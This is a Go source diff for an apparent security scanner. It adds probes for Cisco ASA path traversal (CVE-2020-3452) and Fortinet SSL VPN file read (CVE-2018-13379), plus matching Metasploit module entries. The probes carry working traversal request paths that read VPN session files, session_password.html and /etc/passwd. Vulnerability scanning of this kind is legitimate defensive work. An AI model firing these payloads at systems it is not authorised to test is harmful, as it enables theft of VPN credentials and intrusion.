@@ -39,7 +39,7 @@ import (
 
 // metasploitNativeProbeCount is the number of native Go probe functions called
 // in MetasploitAgent.Run. Update this constant whenever a probe is added or removed.
-const metasploitNativeProbeCount = 19
+const metasploitNativeProbeCount = 21
 
 // MetasploitAgent orchestrates Metasploit-based web exploit checks.
 type MetasploitAgent struct {
@@ -92,6 +92,8 @@ func (a *MetasploitAgent) Run(ctx context.Context, input AgentInput) (AgentOutpu
 	output.Findings = append(output.Findings, probeVBulletinWidgetTemplateRCE(ctx, client, input.Target, input.AuthProfile)...)
 	output.Findings = append(output.Findings, probeF5BIGIPTMUITraversal(ctx, client, input.Target, input.AuthProfile)...)
 	output.Findings = append(output.Findings, probePulseSecureFileDisclosure(ctx, client, input.Target, input.AuthProfile)...)
+	output.Findings = append(output.Findings, probeCiscoASAPathTraversal(ctx, client, input.Target, input.AuthProfile)...)
+	output.Findings = append(output.Findings, probeFortinetSSLVPNFileRead(ctx, client, input.Target, input.AuthProfile)...)
 
 	// ── Phase 2: Metasploit RPC (optional, when msfrpcd is reachable) ─────
 	msfURL := strings.TrimSpace(os.Getenv("MSF_RPC_URL"))
@@ -1123,6 +1125,137 @@ func probePulseSecureFileDisclosure(ctx context.Context, client *http.Client, ta
 	return nil
 }
 
+// probeCiscoASAPathTraversal tests for Cisco ASA/FTD clientless SSL VPN
+// directory traversal (CVE-2020-3452) using known translation-table endpoints.
+func probeCiscoASAPathTraversal(ctx context.Context, client *http.Client, target string, profile model.ScanAuthProfile) []model.Finding {
+	if err := validateMetasploitProbeTarget(target); err != nil {
+		return nil
+	}
+	u, err := url.Parse(target)
+	if err != nil {
+		return nil
+	}
+	u.Path = ""
+	u.RawQuery = ""
+	base := strings.TrimRight(u.String(), "/")
+	paths := []string{
+		"/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/portal_inc.lua",
+		"/+CSCOT+/translation-table?type=mst&textdomain=/%2bCSCOE%2b/session_password.html",
+	}
+
+	for _, p := range paths {
+		probeURL := base + p
+		if err := validateMetasploitProbeTarget(probeURL); err != nil {
+			continue
+		}
+		req, err := http.NewRequestWithContext(ctx, http.MethodGet, probeURL, nil)
+		if err != nil {
+			continue
+		}
+		scanner.ApplyAuthProfile(req, profile)
+
+		resp, err := client.Do(req)
+		if err != nil {
+			continue
+		}
+		body, _ := io.ReadAll(io.LimitReader(resp.Body, 8192))
+		resp.Body.Close()
+		bodyLower := strings.ToLower(string(body))
+
+		leakDetected := strings.Contains(bodyLower, "webvpn") ||
+			strings.Contains(bodyLower, "portal_inc") ||
+			strings.Contains(bodyLower, "session_password") ||
+			strings.Contains(bodyLower, "root:x:0:0:")
+		if resp.StatusCode == http.StatusOK && leakDetected {
+			return []model.Finding{{
+				ID:          "msf-cisco-asa-path-traversal",
+				Category:    "path_traversal",
+				Severity:    model.SeverityHigh,
+				Title:       "Cisco ASA clientless VPN path traversal indicator (CVE-2020-3452)",
+				Description: "The Cisco ASA translation-table endpoint returned sensitive local resource content, indicating CVE-2020-3452 exposure in clientless SSL VPN components.",
+				Evidence:    fmt.Sprintf("path=%s status=%d leak_detected=true", p, resp.StatusCode),
+				Recommendation: "Upgrade Cisco ASA/FTD to a fixed version and disable or restrict clientless SSL VPN access from untrusted networks.",
+				AffectedURL:     probeURL,
+				OWASPCategory:   "OWASP A05:2021 - Security Misconfiguration",
+				CWE:             "CWE-22",
+				CVSSScore:       8.6,
+				CVSSVector:      "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:N/A:N",
+				MITRETechniques: []string{"T1190", "T1005"},
+				References: []string{
+					"https://nvd.nist.gov/vuln/detail/CVE-2020-3452",
+					"https://www.rapid7.com/db/vulnerabilities/cisco-asa-cve-2020-3452/",
+				},
+			}}
+		}
+	}
+	return nil
+}
+
+// probeFortinetSSLVPNFileRead tests for Fortinet SSL VPN credential/session
+// disclosure via traversal on fgt_lang (CVE-2018-13379).
+func probeFortinetSSLVPNFileRead(ctx context.Context, client *http.Client, target string, profile model.ScanAuthProfile) []model.Finding {
+	if err := validateMetasploitProbeTarget(target); err != nil {
+		return nil
+	}
+	u, err := url.Parse(target)
+	if err != nil {
+		return nil
+	}
+	u.Path = ""
+	u.RawQuery = ""
+	base := strings.TrimRight(u.String(), "/")
+	paths := []string{
+		"/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession",
+		"/remote/fgt_lang?lang=/../../../..//////////etc/passwd",
+	}
+
+	for _, p := range paths {
+		probeURL := base + p
+		if err := validateMetasploitProbeTarget(probeURL); err != nil {
+			continue
+		}
+		req, err := http.NewRequestWithContext(ctx, http.MethodGet, probeURL, nil)
+		if err != nil {
+			continue
+		}
+		scanner.ApplyAuthProfile(req, profile)
+
+		resp, err := client.Do(req)
+		if err != nil {
+			continue
+		}
+		body, _ := io.ReadAll(io.LimitReader(resp.Body, 8192))
+		resp.Body.Close()
+		bodyLower := strings.ToLower(string(body))
+
+		leakDetected := strings.Contains(bodyLower, "sslvpn_websession") ||
+			strings.Contains(bodyLower, "var fgt_lang") ||
+			strings.Contains(bodyLower, "root:x:0:0:")
+		if resp.StatusCode == http.StatusOK && leakDetected {
+			return []model.Finding{{
+				ID:          "msf-fortinet-sslvpn-file-read",
+				Category:    "path_traversal",
+				Severity:    model.SeverityHigh,
+				Title:       "Fortinet SSL VPN file disclosure indicator (CVE-2018-13379)",
+				Description: "The Fortinet SSL VPN language endpoint returned sensitive file/session content through traversal, indicating CVE-2018-13379 exposure.",
+				Evidence:    fmt.Sprintf("path=%s status=%d leak_detected=true", p, resp.StatusCode),
+				Recommendation: "Patch FortiOS immediately and rotate VPN credentials/session material potentially exposed by the vulnerability.",
+				AffectedURL:     probeURL,
+				OWASPCategory:   "OWASP A05:2021 - Security Misconfiguration",
+				CWE:             "CWE-22",
+				CVSSScore:       9.8,
+				CVSSVector:      "CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:U/C:H/I:H/A:H",
+				MITRETechniques: []string{"T1190", "T1005"},
+				References: []string{
+					"https://nvd.nist.gov/vuln/detail/CVE-2018-13379",
+					"https://www.rapid7.com/db/modules/auxiliary/gather/fortios_vpnssl_traversal_creds_leak/",
+				},
+			}}
+		}
+	}
+	return nil
+}
+
 func validateMetasploitProbeTarget(target string) error {
 	if strings.EqualFold(strings.TrimSpace(os.Getenv("ABH_ALLOW_LOCAL_TARGETS")), "true") {
 		return nil
@@ -1274,6 +1407,18 @@ func runMSFRPCModules(ctx context.Context, client *http.Client, rpcURL, password
 			name:    "auxiliary/gather/pulse_secure_file_disclosure",
 			title:   "Pulse Secure File Disclosure (CVE-2019-11510)",
 			cve:     "CVE-2019-11510",
+			options: map[string]string{"RHOSTS": rhost, "RPORT": rport, "SSL": ssl},
+		},
+		{
+			name:    "auxiliary/scanner/http/cisco_asa_path_traversal",
+			title:   "Cisco ASA Path Traversal (CVE-2020-3452)",
+			cve:     "CVE-2020-3452",
+			options: map[string]string{"RHOSTS": rhost, "RPORT": rport, "SSL": ssl},
+		},
+		{
+			name:    "auxiliary/gather/fortios_vpnssl_traversal_creds_leak",
+			title:   "Fortinet SSL VPN Traversal Credential Leak (CVE-2018-13379)",
+			cve:     "CVE-2018-13379",
 			options: map[string]string{"RHOSTS": rhost, "RPORT": rport, "SSL": ssl},
 		},
 	}
